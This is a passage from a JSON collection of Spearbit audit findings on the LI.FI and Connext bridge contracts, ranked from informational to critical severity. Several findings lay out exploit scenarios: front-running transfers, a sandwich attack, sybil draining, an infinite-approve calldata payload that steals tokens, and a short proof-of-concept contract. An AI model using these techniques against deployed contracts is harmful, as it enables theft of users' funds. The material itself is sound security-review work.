        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "WithdrawFacet.sol has the following misleading comment which can be removed. Its unclear why this comment was made. address self = address(this); // workaround for a possible solidity bug",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant events/errors/imports on the contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been observed that several events and errors are not used in the contracts. With the deleting redundant events and errors, gas can be saved.  FusePoolZap.sol#L28 - CannotDepositNativeToken  GenericSwapFacet.sol#L7 - ZeroPostSwapBalance  WormholeFacet.sol#L12 - InvalidAmount and InvalidConfig  HyphenFacet.sol#L32 - HyphenInitialized  HyphenFacet.sol#L9 - InvalidAmount and InvalidConfig  HopFacet.sol#L9 - InvalidAmount, InvalidConfig and InvalidBridgeConfigLength  HopFacet.sol#L36- HopInitialized  PolygonBridgeFacet.sol#L28 - InvalidConfig  Executor.sol#L5 - IAxelarGasService  AcrossFacet.sol#L37 - UseWethInstead, InvalidAmount, NativeValueWithERC, InvalidConfig  NXTPFacet.sol#L9 - InvalidAmount, NativeValueWithERC, NoSwapDataProvided, InvalidConfig",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "forceSlow option is disabled on the AmarokFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the AmarokFacet contract, forceSlow option is disabled. According to documentation, forceS- low is an option that allows users to take the Nomad slow path (~30 mins) instead of paying routers a 0.05% fee on their transaction. ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, relayerFee: 0, slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incomplete NatSpec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Some functions are missing @param for some of their parameters. Given that NatSpec is an impor- tant part of code documentation, this affects code comprehension, auditability and usability.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use nonReentrant modifier in a consistent way",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "AxelarFacet, zapIn of the contract FusePoolZap and completeBridgeTokensViaStargate() - swapAndCom- pleteBridgeTokensViaStargate of the StargateFacet dont have a nonReentrant modifier. All other facets that integrate with the external contract do have this modifier. executeCallWithTokenViaAxelar of contract AxelarFacet { function executeCallWithTokenViaAxelar(...) ... { } function executeCallViaAxelar(...) ... { } } contract FusePoolZap { function zapIn(...) ... { } } There are 2 versions of sgReceive() / completeBridgeTokensViaStargate() which use different locations for nonReentrant. The makes the code more difficult to maintain and verify. contract StargateFacet is ILiFi, SwapperV2, ReentrancyGuard { function sgReceive(...) external nonReentrant { ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, receiver); ... } function completeBridgeTokensViaStargate(...) external { ... } } contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function sgReceive(...) external { ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, payable(receiver)); ... } function swapAndCompleteBridgeTokensViaStargate(...) external payable nonReentrant { } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos on the codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Across the codebase, there are typos on the comments.  cancelOnwershipTransfer -> cancelOwnershipTransfer.  addresss -> address.  Conatains -> Contains.  Intitiates -> Initiates.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Store all error messages in GenericErrors.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The file GenericErrors.sol contains several error messages and is used from most other solidity files. However several other error messages are defined in the solidity files themselves. It would be more con- sistent and easier to maintain to store these in GenericErrors.sol as well. Note: the Periphery contract also contains error messages which are not listed below. Here are the error messages contained in the solidity files: Facets/AcrossFacet.sol:37: Facets/AmarokFacet.sol:31: Facets/ArbitrumBridgeFacet.sol:30: Facets/GnosisBridgeFacet.sol:31: Facets/GnosisBridgeFacet.sol:32: Facets/OmniBridgeFacet.sol:27: Facets/OptimismBridgeFacet.sol:29: Facets/OwnershipFacet.sol:20: Facets/OwnershipFacet.sol:21: Facets/OwnershipFacet.sol:22: Facets/OwnershipFacet.sol:23: Facets/PolygonBridgeFacet.sol:28: Facets/PolygonBridgeFacet.sol:29: Facets/StargateFacet.sol:39: Facets/StargateFacet.sol:40: Facets/StargateFacet.sol:41: Facets/WithdrawFacet.sol:20: Facets/WithdrawFacet.sol:21: Helpers/ReentrancyGuard.sol:20: Libraries/LibAccess.sol:18: Libraries/LibSwap.sol:9: error UseWethInstead(); error InvalidReceiver(); error InvalidReceiver(); error InvalidDstChainId(); error InvalidSendingToken(); error InvalidReceiver(); error InvalidReceiver(); error NoNullOwner(); error NewOwnerMustNotBeSelf(); error NoPendingOwnershipTransfer(); error NotPendingOwner(); error InvalidConfig(); error InvalidReceiver(); error InvalidConfig(); error InvalidStargateRouter(); error InvalidCaller(); error NotEnoughBalance(uint256 requested, uint256 available); error WithdrawFailed(); error ReentrancyError(); error UnAuthorized(); error NoSwapFromZeroBalance();",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lack of transferId Verification Allows an Attacker to Front-Run Bridge Transfers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The onReceive() function does not verify the integrity of transferId against all other parameters. Although the onlyBridgeRouter modifier checks that the call originates from another BridgeRouter (assuming a correct configuration of the whitelist) to the onReceive() function, it does not check that the call originates from another Connext Diamond. Therefore, allowing anyone to send arbitrary data to BridgeRouter.sendToHook(), which is later interpreted as the transferId on Connexts NomadFacet.sol contract. This can be abused by a front-running attack as described in the following scenario:  Alice is a bridge user and makes an honest call to transfer funds over to the destination chain.  Bob does not make a transfer but instead calls the sendToHook() function with the same _extraData but passes an _amount of 1 wei.  Both Alice and Bob have their tokens debited on the source chain and must wait for the Nomad protocol to optimistically verify incoming TransferToHook messages.  Once the messages have been replicated onto the destination chain, Bob processes the message before Alice, causing onReceive() to be called on the same transferId.  However, because _amount is not verified against the transferId, Alice receives significantly less tokens and the s.reconciledTransfers mapping marks the transfer as reconciled. Hence, Alice has effectively lost all her tokens during an attempt to bridge them. function onReceive( uint32, // _origin, not used uint32, // _tokenDomain, not used bytes32, // _tokenAddress, of canonical token, not used address _localToken, uint256 _amount, bytes memory _extraData ) external onlyBridgeRouter { bytes32 transferId = bytes32(_extraData); // Ensure the transaction has not already been handled (i.e. previously reconciled). if (s.reconciledTransfers[transferId]) { revert NomadFacet__reconcile_alreadyReconciled(); } // Mark the transfer as reconciled. s.reconciledTransfers[transferId] = true; Note: the same issues exists with _localToken. As a result a malicious user could perform the same attack by using a malicious token contract and transferring the same amount of tokens in the call to sendToHook().",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "swapOut allows overwrite of token balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The StableSwapFacet has the function swapExactOut() where a user could supply the same as- setIn address as assetOut, which means the TokenIndexes for tokenIndexFrom and tokenIndexTo function swapOut() are the same. In function swapOut() a temporay array is used to store balances. When updating such balances, first self.balances[tokenIndexFrom] is updated and then self.balances[tokenIndexTo] is updated afterwards. However when tokenIndexFrom == tokenIndexTo the second update overwrites the first update, causing token balances to be arbitrarily lowered. This also skews the exchange rates, allowing for swaps where value can be extracted. Note: the protection against this problem is location in function getY(). However, this function is not called from swapOut(). Note: the same issue exists in swapInternalOut(), which is called from swapFromLocalAssetIfNeededForEx- actOut() via _swapAssetOut(). However, via this route it is not possible to specify arbitrary token indexes. There- fore, there isnt an immediate risk here. 7 contract StableSwapFacet is BaseConnextFacet { ... function swapExactOut(... ,address assetIn, address assetOut, ... ) ... { return s.swapStorages[canonicalId].swapOut( getSwapTokenIndex(canonicalId, assetIn), getSwapTokenIndex(canonicalId, assetOut), amountOut, maxAmountIn // assetIn could be same as assetOut ); } ... } library SwapUtils { function swapOut(..., uint8 tokenIndexFrom, uint8 tokenIndexTo, ... ) ... { ... uint256[] memory balances = self.balances; ... self.balances[tokenIndexFrom] = balances[tokenIndexFrom].add(dx).sub(dxAdminFee); self.balances[tokenIndexTo] = balances[tokenIndexTo].sub(dy); // overwrites previous update if ,! From==To ... } function getY(..., uint8 tokenIndexFrom, uint8 tokenIndexTo, ... ) ... { ... require(tokenIndexFrom != tokenIndexTo, \"compare token to itself\"); // here is the protection ... } } Below is a proof of concept which shows that the balances of index 3 can be arbitrarily reduced. //SPDX-License-Identifier: MIT pragma solidity 0.8.14; import \"hardhat/console.sol\"; contract test { uint[] balances = new uint[](10); function swap(uint8 tokenIndexFrom,uint8 tokenIndexTo,uint dx) public { uint dy=dx; // simplified uint256[] memory mbalances = balances; balances[tokenIndexFrom] = mbalances[tokenIndexFrom] + dx; balances[tokenIndexTo] = mbalances[tokenIndexTo] - dy; } constructor() { balances[3] = 100; swap(3,3,10); console.log(balances[3]); // 90 } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Use of spot price in SponsorVault leads to sandwich attack.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "There is a special role sponsor in the protocol. Sponsors can cover the liquidity fee and transfer fee for users, making it more favorable for users to migrate to the new chain. Sponsors can either provide liquidity for each adopted token or provide the native token in the SponsorVault. If the native token is provided, the SponsorVault will swap to the adopted token before transferring it to users. contract SponsorVault is ISponsorVault, ReentrancyGuard, Ownable { ... function reimburseLiquidityFees( address _token, uint256 _liquidityFee, address _receiver ) external override onlyConnext returns (uint256) { ... uint256 amountIn = tokenExchange.getInGivenExpectedOut(_token, _liquidityFee); amountIn = currentBalance >= amountIn ? amountIn : currentBalance; // sponsored fee may end being less than _liquidityFee due to slippage sponsoredFee = tokenExchange.swapExactIn{value: amountIn}(_token, msg.sender); ... } } The spot AMM price is used when doing the swap. Attackers can manipulate the value of getInGivenExpectedOut and make SponsorVault sell the native token at a bad price. By executing a sandwich attack the exploiters can drain all native tokens in the sponsor vault. For the sake of the following example, assume that _token is USDC and native token is ETH, the sponsor tries to sponsor 100 usdc to the users:  Attacker first manipulates the DEX and makes the exchange of 1 ETH = 0.1 USDC.  getInGivenExpectedOut returns 100 / 0.1 = 1000.  tokenExchange.swapExactIn buys 100 USDC with 1000 ETH, causing the ETH price to decrease even lower.  Attacker buys ETH at a lower prices and realizes a profit.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Configuration is crucial (both Nomad and Connext)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The Connext and Nomad protocol rely heavily on configuration parameters. These parameters are configured during deployment time and are updated afterwards. Configuration errors can have major conse- quences. Examples of important configurations are:  BridgeFacet.sol: s.promiseRouter.  BridgeFacet.sol: s.connextions.  BridgeFacet.sol: s.approvedSequencers.  Router.sol: remotes[].  xAppConnectionManager.sol: home .  xAppConnectionManager.sol: replicaToDomain[].  xAppConnectionManager.sol: domainToReplica[].",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Deriving price with balanceOf is dangerous",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "getPriceFromDex derives the price by querying the balance of AMMs pools. function getPriceFromDex(address _tokenAddress) public view returns (uint256) { PriceInfo storage priceInfo = priceRecords[_tokenAddress]; ... uint256 rawTokenAmount = IERC20Extended(priceInfo.token).balanceOf(priceInfo.lpToken); ... uint256 rawBaseTokenAmount = IERC20Extended(priceInfo.baseToken).balanceOf(priceInfo.lpToken); ... } Deriving the price with balanceOf is dangerous as balanceOf may be gamed. Consider univ2 as an example; Exploiters can first send tokens into the pool and pump the price, then absorb the tokens that were previously donated by calling mint.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Routers can sybil attack the sponsor vault to drain funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When funds are bridged from source to destination chain messages must first go through optimistic verification before being executed on the destination BridgeFacet.sol contract. Upon transfer processing the contract checks if the domain is sponsored. If such is the case then the user is reimbursed for both liquidity fees paid when the transfer was initiated and for the fees paid to the relayer during message propagation. There currently isnt any mechanism to detect sybil attacks. Therefore, a router can perform several large value transfers in an effort to drain the sponsor vault of its funds. Because liquidity fees are paid to the router by a user connected to the router, there isnt any value lost in this type of attack.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Routers are exposed to extreme slippage if they attempt to repay debt before being reconciled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When routers are reconciled, the local asset may need to be exchanged for the adopted asset in order to repay the unbacked Aave loan. AssetLogic.swapFromLocalAssetIfNeededForExactOut() takes two key arguments:  _amount representing exactly how much of the adopted asset should be received.  _maxIn which is used to limit slippage and limit how much of the local asset is used in the swap. Upon failure to swap, the protocol will reset the values for unbacked Aave debt and distribute local tokens to the router. However, if this router partially paid off some of the unbacked Aave debt before being reconciled, _maxIn will diverge from _amount, allowing value to be extracted in the form of slippage. As a result, routers may receive less than the amount of liquidity they initially provided, leading to router insolvency.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Malicious call data can DOS execute",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "An attacker can DOS the executor contract by giving infinite allowance to normal users. Since the executor increases allowance before triggering an external call, the tx will always revert if the allowance is already infinite. 11 function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes ,! memory) { ... if (!isNative && hasValue) { SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); // reverts if set to `infinite` before } ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(...) // can set to `infinite` allowance ... ,! ,! }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "DOS attack on the Nomad Home.sol Contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Upon calling xcall(), a message is dispatched via Nomad. A hash of this message is inserted into the merkle tree and the new root will be added at the end of the queue. Whenever the updater of Home.sol commits to a new root, improperUpdate() will check that the new update is not fraudulent. In doing so, it must iterate through the queue of merkle roots to find the correct committed root. Because anyone can dispatch a message and insert a new root into the queue it is possible to impact the availability of the protocol by preventing honest messages from being included in the updated root. function improperUpdate(..., bytes32 _newRoot, ... ) public notFailed returns (bool) { ... // if the _newRoot is not currently contained in the queue, // slash the Updater and set the contract to FAILED state if (!queue.contains(_newRoot)) { _fail(); ... } ... } function contains(Queue storage _q, bytes32 _item) internal view returns (bool) { for (uint256 i = _q.first; i <= _q.last; i++) { if (_q.queue[i] == _item) { return true; } } return false; }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Upon failing to back unbacked debt _reconcileProcessPortal() will leave the converted asset in the contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When routers front liquidity for the protocols users they are later reconciled once the bridge has optimistically verified transfers from the source chain. Upon being reconciled, the _reconcileProcessPortal() attempts to first pay back Aave debt before distributing the rest back to the router. However, _reconcileProcess- Portal() will not convert the adopted asset back to the local asset in the case where the call to the Aave pool fails. Instead, the function will set amountIn = 0 and continue to distribute the local asset to the router. if (success) { emit AavePortalRepayment(_transferId, adopted, backUnbackedAmount, portalFee); } else { // Reset values s.portalDebt[_transferId] += backUnbackedAmount; s.portalFeeDebt[_transferId] += portalFee; // Decrease the allowance SafeERC20.safeDecreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount); // Update the amount repaid to 0, so the amount is credited to the router amountIn = 0; emit AavePortalRepaymentDebt(_transferId, adopted, s.portalDebt[_transferId], s.portalFeeDebt[_transferId]); ,! }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_handleExecuteTransaction() doesnt handle native assets correctly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function _handleExecuteTransaction() sends any native tokens to the executor contract first, and then calls s.executor.execute(). This means that within that function msg.value will always be 0. So the associated logic that uses msg.value doesnt work as expected and the function doesnt handle native assets correctly. Note: also see issue \"Executor reverts on receiving native tokens from BridgeFacet\" contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(...)... { ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); (bool success, bytes memory returnData) = s.executor.execute(...); // no native tokens send } } contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... if (isNative && msg.value != _args.amount) { // msg.value is always 0 ... } } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Add checks to xcall()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function xcall() does some sanity checks, nevertheless more checks should be added to prevent issues later on in the use of the protocol. If _args.recovery== 0 then _sendToRecovery() will send funds to the 0 address, effectively losing them. If _params.agent == 0 the forceReceiveLocal cant be used and funds might be locked forever. The _args.params.destinationDomain should never be s.domain, although this is also implicitly checked via _mustHaveRemote() assuming a correct configuration. If _args.params.slippageTol is set to something greater than s.LIQUIDITY_FEE_DENOMINATOR then funds can be locked as xcall() allows for the user to provide the local asset, avoiding any swap while _handleExecuteLiquid- ity() in execute() may attempt to perform a swap on the destination chain. function xcall(XCallArgs calldata _args) external payable nonReentrant whenNotPaused returns (bytes32) { // Sanity checks. ... } 14",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Executor and AssetLogic deals with the native tokens inconsistently that breaks execute()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When dealing with an external callee the BridgeFacet will transfer liquidity to the Executor before calling Executor.execute. In order to send the native token:  The Executor checks for _args.assetId == address(0).  AssetLogic.transferAssetFromContract() disallows address(0). Note: also see issue Executor reverts on receiving native tokens from BridgeFacet. 15 contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction() ...{ ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); // _asset may not ,! be 0 (bool success, bytes memory returnData) = s.executor.execute( IExecutor.ExecutorArgs( // assetId parameter from ExecutorArgs // must be 0 for Native asset ... _asset, ... ) ); ... } } library AssetLogic { function transferAssetFromContract( address _assetId, ... ) { ... // No native assets should ever be stored on this contract if (_assetId == address(0)) revert AssetLogic__transferAssetFromContract_notNative(); if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } } } contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... bool isNative = _args.assetId == address(0); ... } } The BridgeFacet cannot handle external callees when using native tokens.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Executor reverts on receiving native tokens from BridgeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When doing an external call in execute(), the BridgeFacet provides liquidity into the Executor contract before calling Executor.execute. The BridgeFacet transfers native token when address(wrapper) is provided. The Executor however does not have a fallback/ receive function. Hence, the transaction will revert when the BridgeFacet tries to send the native token to the Executor contract. function _handleExecuteTransaction( ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); (bool success, bytes memory returnData) = s.executor.execute(...); ... } function transferAssetFromContract(...) ... { ... if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } else { ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "SponsorVault sponsors full transfer amount in reimburseLiquidityFees()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The BridgeFacet passes args.amount as _liquidityFee when calling reimburseLiquidityFees. Instead of sponsoring liquidityFee, the sponsor vault would sponsor full transfer amount to the reciever. Note: Luckily the amount in reimburseLiquidityFees is capped by relayerFeeCap. function _handleExecuteTransaction(...) ... { ... (bool success, bytes memory data) = address(s.sponsorVault).call( abi.encodeWithSelector(s.sponsorVault.reimburseLiquidityFees.selector, _asset, _args.amount, _args.params.to) ); ,! } 17",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Tokens can get stuck in Executor contract if the destination doesnt claim them all",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function execute() increases allowance and then calls the recipient (_args.to). When the recipient does not use all tokens, these could remain stuck inside the Executor contract. Note: the executor can have excess tokens, see: kovan executor. Note: see issue \"Malicious call data can DOS execute or steal unclaimed tokens in the Executor contract\". function execute(...) ... { ... if (!isNative && hasValue) { SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); } ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, ... ); ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "reimburseLiquidityFees send tokens twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function reimburseLiquidityFees() is called from the BridgeFacet, making the msg.sender within this function to be BridgeFacet. When using tokenExchanges via swapExactIn() tokens are sent to msg.sender, which is the BridgeFacet. Then, tokens are sent again to msg.sender via safeTransfer(), which is also the BridgeFacet. Therefore, tokens end up being sent to the BridgeFacet twice. Note: the check ...balanceOf(...) != starting + sponsored should fail too. Note: The fix in C4 seems to introduce this issue: code4rena-246 18 contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(... ) ... { ... uint256 starting = IERC20(_asset).balanceOf(address(this)); ... (bool success, bytes memory data) = address(s.sponsorVault).call( abi.encodeWithSelector(s.sponsorVault.reimburseLiquidityFees.selector, _asset, _args.amount, ,! _args.params.to) ); if (success) { uint256 sponsored = abi.decode(data, (uint256)); // Validate correct amounts are transferred if (IERC20(_asset).balanceOf(address(this)) != starting + sponsored) { // this should revert BridgeFacet__handleExecuteTransaction_invalidSponsoredAmount(); ,! fail now } ... } ... } } contract SponsorVault is ISponsorVault, ReentrancyGuard, Ownable { function reimburseLiquidityFees(... ) { if (address(tokenExchanges[_token]) != address(0)) { ... sponsoredFee = tokenExchange.swapExactIn{value: amountIn}(_token, msg.sender); // send to ,! msg.sender } else { ... } ... IERC20(_token).safeTransfer(msg.sender, sponsoredFee); // send again to msg.sender } } interface ITokenExchange { /** * @notice Swaps the exact amount of native token being sent for a given token. * @param token The token to receive * @param recipient The recipient of the token * @return The amount of tokens resulting from the swap */ function swapExactIn(address token, address recipient) external payable returns (uint256); }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Anyone can repay the portalDebt with different tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Routers can provide liquidity in the protocol to improve the UX of cross-chain transfers. Liquidity is sent to users under the routers consent before the cross-chain message is settled on the optimistic message protocol, i.e., Nomad. The router can also borrow liquidity from AAVE if the router does not have enough of it. It is the routers responsibility to repay the debt to AAVE. contract PortalFacet is BaseConnextFacet { function repayAavePortalFor( address _adopted, uint256 _backingAmount, uint256 _feeAmount, bytes32 _transferId ) external payable { address adopted = _adopted == address(0) ? address(s.wrapper) : _adopted; ... // Transfer funds to the contract uint256 total = _backingAmount + _feeAmount; if (total == 0) revert PortalFacet__repayAavePortalFor_zeroAmount(); (, uint256 amount) = AssetLogic.handleIncomingAsset(_adopted, total, 0); ... // repay the loan _backLoan(adopted, _backingAmount, _feeAmount, _transferId); } } The PortalFacet does not check whether _adopted is the correct token in debt. Assume that the protocol borrows ETH for the current _transferId, therefore Router should repay ETH to clear the debt. However, the Router can provide any valid tokens, e.g. DAI, USDC, to clear the debt. This results in the insolvency of the protocol. Note: a similar issue is also present in repayAavePortal().",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Malicious call data can steal unclaimed tokens in the Executor contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Users can provide a destination contract args.to and arbitrary data _args.callData when doing a cross-chain transfer. The protocol will provide the allowance to the callee contract and triggers the function call through ExcessivelySafeCall.excessivelySafeCall. 20 contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); ... // Try to execute the callData // the low level call will return `false` if its execution reverts (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, gas, isNative ? _args.amount : 0, MAX_COPY, _args.callData ); ... } } Since there arent restrictions on the destination contract and calldata, exploiters can steal the tokens from the executor. Note: the executor does have excess tokens, see: see: kovan executor. Note: see issue Tokens can get stuck in Executor contract. Tokens can be stolen by granting an allowance. Setting calldata = abi.encodeWithSelector(ERC20.approve.selector, exploiter, type(uint256).max); and args.to = tokenAddress allows the exploiter to get an infinite allowance of any token, effectively stealing any unclaimed tokens left in the executor.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Fee-On-Transfer tokens are not explicitly denied in swap()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The swap() function is used extensively within the Connext protocol, primarily when swapping be- tween local and adopted assets. When a swap is performed, the function will check the actual amount transferred. However, this is not consistent with other swap functions which check that the amount transferred is equal to dx. As a result, overwriting dx with tokenFrom.balanceOf(address(this)).sub(beforeBalance) allows for fee-on- transfer tokens to work as intended.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "xcall() may erroneously overwrite prior calls to bumpTransfer()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The bumpTransfer() function allows users to increment the relayer fee on any given transferId without checking if the unique transfer identifier exists. As a result, a subsequent call to xcall() will overwrite the s.relayerFees mapping, leading to lost funds.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_handleExecuteLiquidity doesnt consistently check for receiveLocalOverrides",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function _handleExecuteLiquidity() initially checks for receiveLocal but does not check for receiveLocalOverrides. Later on it does check for both of values. function _handleExecuteLiquidity(... ) ... { ... if ( !_args.params.receiveLocal && // doesn't check for receiveLocalOverrides s.routerBalances[_args.routers[0]][_args.local] < toSwap && s.aavePool != address(0) ) { ... if (_args.params.receiveLocal || s.receiveLocalOverrides[_transferId]) { // extra check return (toSwap, _args.local); } } 22 As a result, the portal may pay the bridge user in the adopted asset when they opted to override this behaviour to avoid slippage conditions outside of their boundaries, potentially leading to an unwarranted reception of funds denominated in the adopted asset.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Router signatures can be replayed when executing messages on the destination domain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Connext bridge supports near-instant transfers by allowing users to pay a small fee to routers for providing them with liquidity. Gelato relayers are tasked with taking in bids from liquidity providers who sign a message consisting of the transferId and path length. The path length variable only guarantees that the message they signed will only be valid if _args.routers.length - 1 routers are also selected. However, it does not prevent Gelato relayers from re-using the same signature multiple times. As a result, routers may unintentionally provide more liquidity than expected.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "diamondCut() allows re-execution of old updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
